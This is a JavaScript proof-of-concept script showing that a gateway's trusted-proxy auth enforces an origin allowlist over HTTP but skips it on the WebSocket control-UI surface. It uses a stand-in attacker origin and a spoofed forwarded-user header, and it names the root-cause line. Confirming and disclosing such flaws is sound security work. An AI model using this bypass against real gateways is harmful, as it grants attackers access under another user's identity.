import { authorizeGatewayConnect, authorizeHttpGatewayConnect } from "../../src/gateway/auth.js";

const TRUSTED_PROXY_IP = "10.0.0.1";
const VICTIM_GATEWAY_HOST = "gateway.example.com";
const ATTACKER_ORIGIN = "https://evil.attacker.com";
const ALLOWED_ORIGIN = "https://control.example.com";

const trustedProxyConfig = {
  userHeader: "x-forwarded-user",
  requiredHeaders: ["x-forwarded-proto"],
  allowUsers: [],
};

const baseAuth = {
  mode: "trusted-proxy",
  allowTailscale: false,
  trustedProxy: trustedProxyConfig,
};

const fakeReq = (extraHeaders = {}) => ({
  socket: { remoteAddress: TRUSTED_PROXY_IP },
  headers: {
    host: VICTIM_GATEWAY_HOST,
    "x-forwarded-user": "victim@example.com",
    "x-forwarded-proto": "https",
    ...extraHeaders,
  },
});

const browserOriginPolicy = {
  requestHost: VICTIM_GATEWAY_HOST,
  origin: ATTACKER_ORIGIN,
  allowedOrigins: [ALLOWED_ORIGIN],
};

// --- Step 1: Confirm HTTP surface REJECTS attacker origin (baseline control) ---
const httpResult = await authorizeHttpGatewayConnect({
  auth: baseAuth,
  connectAuth: null,
  trustedProxies: [TRUSTED_PROXY_IP],
  req: fakeReq({ origin: ATTACKER_ORIGIN }),
  browserOriginPolicy,
});

console.log("[HTTP surface] attacker origin result:", JSON.stringify(httpResult));
if (httpResult.ok !== false || httpResult.reason !== "trusted_proxy_origin_not_allowed") {
  console.error("UNEXPECTED: HTTP baseline did not block attacker origin — check test setup");
  process.exit(2);
}
console.log("[HTTP surface] BLOCKED as expected (origin check fires correctly)\n");

// --- Step 2: Same attacker origin over WS surface — origin check is SKIPPED ---
// authorizeGatewayConnect with authSurface = "ws-control-ui" calls
// authorizeTrustedProxyBrowserOrigin which immediately returns null (line 320-322),
// bypassing the browserOriginPolicy allowlist entirely.
const wsResult = await authorizeGatewayConnect({
  auth: baseAuth,
  connectAuth: null,
  trustedProxies: [TRUSTED_PROXY_IP],
  req: fakeReq({ origin: ATTACKER_ORIGIN }),
  authSurface: "ws-control-ui",  // <-- non-http surface triggers bypass
  browserOriginPolicy,            // <-- allowedOrigins=[control.example.com], but silently ignored
});

console.log("[WS surface]   attacker origin result:", JSON.stringify(wsResult));

const bypassed = wsResult.ok === true && wsResult.method === "trusted-proxy";
const evidence = bypassed
  ? `trusted-proxy auth succeeded for origin '${ATTACKER_ORIGIN}' on ws-control-ui surface despite allowedOrigins=[${ALLOWED_ORIGIN}]`
  : `auth did not succeed: ${JSON.stringify(wsResult)}`;

if (!bypassed) {
  console.log(JSON.stringify({ status: "failed", evidence, notes: "Origin check was not bypassed" }));
  process.exit(1);
}

console.log(`[WS surface]   BYPASSED — connection accepted as user '${wsResult.user}'\n`);
console.log("Root cause: src/gateway/auth.ts:320 — authorizeTrustedProxyBrowserOrigin returns null");
console.log("            immediately when authSurface !== 'http', skipping checkBrowserOrigin().\n");

console.log(JSON.stringify({
  status: "confirmed",
  evidence,
  notes: "authorizeTrustedProxyBrowserOrigin line 320: early return null when authSurface !== 'http' silently drops origin enforcement for all WS surfaces",
}));
